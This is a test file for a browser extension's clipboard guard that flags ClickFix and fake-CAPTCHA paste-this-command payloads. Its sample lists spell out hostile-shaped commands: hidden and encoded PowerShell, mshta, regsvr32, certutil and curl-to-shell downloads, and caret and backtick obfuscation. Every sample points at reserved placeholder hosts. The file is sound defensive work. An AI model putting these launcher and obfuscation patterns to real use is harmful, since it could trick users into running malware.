// Tests for the nerd mode clipboard guard: the dangerous-command detector
// on ClickFix-shaped payloads and on everyday clipboard text, the
// allow/deny rule (src/main/clip-detect.ts), and the MAIN <-> ISOLATED
// channel encoding (src/main/nerd-channel.ts).
//
// The "high" samples reproduce the SHAPE of ClickFix / fake-CAPTCHA payloads
// (launcher, flags, lure comment, obfuscation) with inert content: reserved
// hosts (example.invalid, 192.0.2.0/24), and base64 that decodes to
// "Write-Output test" / "hello world". Real samples are deliberately not
// stored in the repository (antivirus engines quarantine files with them).
//
// SPDX-License-Identifier: GPL-3.0-or-later

import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  CLIP_REPLACEMENT,
  clipSample,
  collapseWs,
  containsCollapsed,
  decideClip,
  detectDangerousCommand,
  MAX_SCAN,
  normalizeCommand,
} from '../../src/main/clip-detect.ts';
import { encodeClipCheck, encodeFp, FP_ORDER, nerdEventName, nerdSentinel, parseNerdDetail } from '../../src/main/nerd-channel.ts';

const sev = (s: string) => detectDangerousCommand(s)?.severity ?? null;
const rule = (s: string) => detectDangerousCommand(s)?.rule ?? null;

/** base64 of UTF-16LE "Write-Output test" (what -EncodedCommand expects). */
const B64_PS = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAB0AGUAcwB0AA==';

const HIGH: readonly [string, string][] = [
  ['lure-comment', 'cmd /c echo hello # I am not a robot - reCAPTCHA Verification ID: 1234'],
  ['lure-comment', 'curl https://example.invalid/a # Cloudflare Ray ID: 8a1b'],
  ['powershell-encoded', `powershell -NoProfile -Enc ${B64_PS}`],
  ['powershell-encoded', `pwsh -EncodedCommand ${B64_PS}`],
  ['powershell-encoded', `powershell.exe -eC ${B64_PS}`],
  ['powershell-hidden', 'powershell -w hidden -c "Write-Output (irm https://example.invalid/a)"'],
  ['powershell-hidden', 'powershell -WindowStyle Hidden -c "Invoke-WebRequest https://example.invalid/a"'],
  ['powershell-hidden', 'p^o^w^e^r^s^h^e^l^l -w h -c "echo (i`r`m https://example.invalid/a)"'],
  ['powershell-hidden', 'powershell \u2013w hidden \u2013c "irm https://example.invalid/a"'], // en dashes work as dashes in PowerShell
  ['powershell-hidden', 'pow""ershell -w hid -c irm https://example.invalid/a'],
  ['base64-exec', `powershell -c "[Convert]::FromBase64String('aGVsbG8=')"`],
  ['mshta', 'mshta https://example.invalid/page.hta'],
  ['mshta', 'mshta vbscript:Close(1)'],
  ['rundll32-regsvr32', 'rundll32 \\\\192.0.2.1@80\\share\\test.dll,Main'],
  ['rundll32-regsvr32', 'regsvr32 /s /i:https://example.invalid/test.sct scrobj.dll'],
  ['certutil', 'certutil -urlcache -f https://example.invalid/readme.txt readme.txt'],
  ['bitsadmin', 'bitsadmin /transfer job https://example.invalid/readme.txt C:\\Temp\\readme.txt'],
  ['msiexec-remote', 'msiexec /i https://example.invalid/test.msi'],
  ['cmd-payload', 'cmd /c curl -o %TEMP%\\readme.txt https://example.invalid/readme.txt'],
  ['cmd-payload', 'cmd.exe /k start pwsh'],
  ['conhost-headless', 'conhost --headless pwsh -c "echo test"'],
  ['finger-pipe', 'finger test@192.0.2.1 | cmd'],
  ['wscript-remote', 'cscript //nologo https://example.invalid/test.js'],
  ['webdav-unc', 'notepad \\\\192.0.2.1@SSL\\DavWWWRoot\\test.txt'],
  ['base64-shell', 'echo aGVsbG8gd29ybGQK | base64 -d | sh'],
  ['osascript', `osascript -e 'do shell script "echo test"'`],
  ['curl-shell-insecure', 'curl -k https://example.invalid/test.sh | sh'],
  ['curl-shell-insecure', 'curl http://example.invalid/test.sh | sh'],
  ['curl-shell-insecure', 'curl -s 192.0.2.1/test.sh | bash'],
  ['curl-shell-insecure', '/bin/bash -c "$(curl -fsSL http://192.0.2.1/test.sh)"'],
  ['powershell-download-exec-insecure', 'irm http://example.invalid/test.ps1 | iex'],
];

// Download-and-run one-liners as real install docs show them.
const MEDIUM: readonly string[] = [
  'curl -fsSL https://get.docker.com | sh',
  "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
  '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
  'irm get.scoop.sh | iex',
  'powershell -c "irm bun.sh/install.ps1|iex"',
  "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))",
  'wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash',
  'curl -LsSf https://astral.sh/uv/install.sh | sudo sh',
];

const BENIGN: readonly string[] = [
  'Hello world, this is a normal sentence.',
  'https://example.com/path?q=1&r=2',
  'git clone https://github.com/user/repo.git',
  'npm install --save-dev typescript',
  'npm start # verify it works',
  'pip install requests',
  'curl -O https://example.com/file.tar.gz',
  'curl https://api.example.com/v1/users | jq .',
  'cat notes.txt | shuf | head',
  'Get-ChildItem -Path C:\\Users | Sort-Object Length',
  'cmd /c dir',
  'PowerShell is a cross-platform task automation solution made up of a command-line shell.',
  'Use powershell -ExecutionPolicy Bypass -File .\\build.ps1 to run the build.',
  'echo hello | base64',
  'docker run -it --rm ubuntu bash',
  'ssh user@host.example',
  'I am not a robot',
  '#1 tip: verify your account settings',
  '# Install\n\nRun `npm ci`, then `npm test`.',
  'Bitte geben Sie den Bestätigungscode ein: 482913',
  'IBAN CH93 0076 2011 6238 5295 7',
  'const x = await fetch("https://api.example.com"); // download data',
  'Invoke-WebRequest -Uri https://example.com/file.zip -OutFile file.zip',
  'certutil -hashfile setup.exe SHA256',
  'msiexec /i C:\\Downloads\\setup.msi',
  'rundll32.exe shell32.dll,Control_RunDLL',
  'mshta',
  '',
];

test('ClickFix-shaped payloads are high severity, with the expected rule', () => {
  for (const [r, s] of HIGH) {
    assert.equal(sev(s), 'high', s);
    assert.equal(rule(s), r, s);
  }
});

test('install one-liners are medium severity (allowed when visible on the page)', () => {
  for (const s of MEDIUM) assert.equal(sev(s), 'medium', s);
});

test('everyday clipboard text is not flagged', () => {
  for (const s of BENIGN) assert.equal(detectDangerousCommand(s), null, s);
  assert.equal(detectDangerousCommand(undefined), null);
  assert.equal(detectDangerousCommand(42), null);
});

test('insecure transport escalates a download-and-run line to high', () => {
  assert.deepEqual(detectDangerousCommand('curl -fsSL https://get.docker.com | sh'), { severity: 'medium', rule: 'curl-shell' });
  assert.deepEqual(detectDangerousCommand('curl -fsSL http://get.docker.com | sh'), { severity: 'high', rule: 'curl-shell-insecure' });
  assert.equal(sev('irm http://get.scoop.sh | iex'), 'high');
  assert.equal(sev('irm 192.0.2.5/install.ps1 | iex'), 'high');
});

test('the replacement text is harmless', () => {
  assert.equal(detectDangerousCommand(CLIP_REPLACEMENT), null);
  assert.ok(CLIP_REPLACEMENT.startsWith('# '));
  assert.ok(!/[\r\n|&;`$]/.test(CLIP_REPLACEMENT));
});

test('padding beyond the scan window cannot hide a command', () => {
  const padded = 'powershell -c "' + ' '.repeat(MAX_SCAN + 10) + 'irm https://example.invalid/a"';
  assert.equal(sev(padded), 'high');
  assert.equal(detectDangerousCommand('a'.repeat(MAX_SCAN * 2)), null);
});

test('normalisation removes common obfuscation', () => {
  assert.equal(normalizeCommand('P^OW^ERSHELL  -W\tHIDDEN'), 'powershell -w hidden');
  assert.equal(normalizeCommand('i`e`x'), 'iex');
  assert.equal(normalizeCommand('pow""er\'\'shell'), 'powershell');
  assert.equal(normalizeCommand('a\u200bb \u2013 c'), 'ab - c');
  assert.equal(collapseWs('  a \n\t b\u00a0c '), 'a b c');
});

const ctx = (userCopy: boolean, selection: string, visible: boolean) => ({ userCopy, selection, visible: () => visible });

test('allow/deny: the user copying their own selection is always allowed', () => {
  const cmd = HIGH[0][1];
  const v = detectDangerousCommand(cmd);
  assert.equal(decideClip(cmd, v, ctx(true, cmd, false)), false);
  // Whitespace differences between selection and payload do not matter.
  assert.equal(decideClip(cmd, v, ctx(true, `  ${cmd.replace(/ /g, '\n')} `, false)), false);
});

test('allow/deny: high payloads written by the page are blocked', () => {
  const cmd = HIGH[5][1];
  const v = detectDangerousCommand(cmd);
  assert.equal(decideClip(cmd, v, ctx(false, '', false)), true, 'writeText without selection');
  assert.equal(decideClip(cmd, v, ctx(false, cmd, true)), true, 'script-triggered copy of a selection');
  assert.equal(decideClip(cmd, v, ctx(true, 'Click the checkbox to continue', true)), true, 'copy handler swaps the selection');
});

test('allow/deny: medium payloads pass only when visible on the page', () => {
  const cmd = MEDIUM[0];
  const v = detectDangerousCommand(cmd);
  assert.equal(decideClip(cmd, v, ctx(false, '', true)), false, 'copy button next to a code block');
  assert.equal(decideClip(cmd, v, ctx(false, '', false)), true, 'hidden textarea / string in a script');
  const throwing = { userCopy: false, selection: '', visible: (): boolean => { throw new Error('x'); } };
  assert.equal(decideClip(cmd, v, throwing), true);
  assert.equal(decideClip('hello', null, ctx(false, '', false)), false);
});

test('visible-text check and samples', () => {
  assert.ok(containsCollapsed('Install:\n  curl -fsSL https://get.docker.com\n  | sh\nDone', 'curl -fsSL https://get.docker.com | sh'));
  assert.ok(!containsCollapsed('nothing here', 'curl -fsSL https://get.docker.com | sh'));
  assert.ok(!containsCollapsed('anything', '   '));
  assert.equal(clipSample('a\n b'), 'a b');
  const long = clipSample('x'.repeat(1000));
  assert.equal(long.length, 200);
  assert.ok(long.endsWith('…'));
});

test('channel: event name and sentinel depend on the extension origin', () => {
  const a = 'chrome-extension://abcdefghijklmnopabcdefghijklmnop/';
  const b = 'chrome-extension://ponmlkjihgfedcbaponmlkjihgfedcba/';
  assert.equal(nerdEventName(a), nerdEventName(a));
  assert.notEqual(nerdEventName(a), nerdEventName(b));
  assert.match(nerdEventName(a), /^bsn[0-9a-z]+$/);
  assert.notDeepEqual(nerdSentinel(a, 'clipguard'), nerdSentinel(a, 'fpmeter'));
  assert.notDeepEqual(nerdSentinel(a, 'clipguard'), nerdSentinel(b, 'clipguard'));
});

test('channel: clip checks round-trip, including separators in the text', () => {
  const text = 'a|b|c\nd';
  assert.deepEqual(parseNerdDetail(encodeClipCheck('writeText', false, text)), { kind: 'clip', source: 'writeText', userCopy: false, text });
  assert.deepEqual(parseNerdDetail(encodeClipCheck('setData', true, '')), { kind: 'clip', source: 'setData', userCopy: true, text: '' });
  assert.deepEqual(parseNerdDetail(encodeClipCheck('exec', false, '')), { kind: 'clip', source: 'exec', userCopy: false, text: '' });
});

test('channel: fp counts round-trip; forged or malformed details are rejected', () => {
  const counts = [3, 0, 1, 0, 25, 7, 0, 0];
  assert.deepEqual(parseNerdDetail(encodeFp(counts)), { kind: 'fp', counts: { canvas: 3, audio: 1, navigator: 25, screen: 7 } });
  assert.equal(FP_ORDER.length, counts.length);
  assert.equal(parseNerdDetail(encodeFp([0, 0, 0, 0, 0, 0, 0, 0])), null);
  for (const bad of [null, 1, {}, '', 'x', 'c|', 'c|nope|0|x', 'c|write|2|x', 'c|write|0x', 'f|1,2,-3', 'f|1e9', 'f|1,2,3,4,5,6,7,8,9', 'f|' + '1,'.repeat(300), 'z|1']) {
    assert.equal(parseNerdDetail(bad), null, String(bad));
  }
});
